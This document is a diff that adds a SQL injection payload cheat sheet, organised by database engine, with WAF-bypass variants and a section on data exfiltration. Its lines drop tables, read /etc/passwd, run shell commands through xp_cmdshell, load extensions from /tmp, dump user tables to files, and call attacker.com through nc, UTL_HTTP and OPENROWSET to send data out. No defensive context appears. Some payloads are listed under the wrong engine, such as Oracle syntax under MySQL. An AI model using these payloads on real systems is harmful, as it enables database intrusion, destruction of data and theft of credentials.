@@ -1,0 +1,48 @@
+Bypassing Web Application Firewalls (WAFs):
+' OR '1'='1' /* --'
+' OR '1'='1' %00
+' OR '1'='1' # 
+' OR '1'='1'-- 
+
+
+MySQL:
+' OR 1=1; EXECUTE IMMEDIATE 'DROP TABLE users'; --
+' UNION SELECT table_schema, table_name FROM information_schema.tables; --
+' AND 1=LOAD_FILE('/etc/passwd'); --
+' AND 1=BENCHMARK(5000000,MD5('A')); --
+
+PostgreSQL:
+'; COPY users TO '/tmp/users.csv' DELIMITER ',' CSV HEADER; --
+'; CREATE TABLE temp AS SELECT * FROM users; --
+'; SELECT * FROM pg_catalog.pg_tables; --
+'; COPY (SELECT * FROM users) TO PROGRAM 'nc attacker.com 1234'; --
+
+Oracle:
+' OR 1=1; EXECUTE IMMEDIATE 'DROP TABLE users'; --
+' UNION SELECT table_name, column_name FROM all_tab_columns; --
+' AND 1=UTL_HTTP.request('http://attacker.com'); --
+' AND 1=DBMS_LOCK.SLEEP(5); --
+
+Microsoft SQL Server:
+'; EXEC sp_executesql N'SELECT * FROM sys.databases'; --
+'; EXEC sp_OACreate 'Scripting.FileSystemObject', @Object OUT; --
+'; EXEC xp_cmdshell 'dir'; --
+'; EXEC xp_dirtree 'C:\\'; --
+
+SQLite:
+'; ATTACH DATABASE '/tmp/malicious.db' AS malicious; --
+'; SELECT * FROM sqlite_master; --
+'; SELECT load_extension('/tmp/malicious_extension'); --
+'; DETACH DATABASE malicious; --
+
+Cross-Database Techniques:
+' UNION SELECT NULL, NULL WHERE 1=1; EXEC xp_cmdshell('ping attacker.com'); --
+' UNION ALL SELECT NULL, NULL WHERE 1=2; DROP TABLE users; --
+' UNION SELECT NULL, NULL FROM dual; --
+
+Data Exfiltration Techniques:
+' UNION SELECT NULL, NULL WHERE 1=1 INTO OUTFILE '/var/www/html/exfiltrated_data.txt'; --
+' AND 1=(SELECT * FROM OPENROWSET('SQLNCLI', 'Server=attacker.com;UID=sa;PWD=password;', 'SELECT * FROM users')); --
+' AND 1=(SELECT * FROM mysql.user INTO OUTFILE '/tmp/mysql_users.txt'); --
+' UNION SELECT NULL, NULL, NULL FROM information_schema.tables INTO DUMPFILE '/tmp/tables_dump.txt'; --
+"""
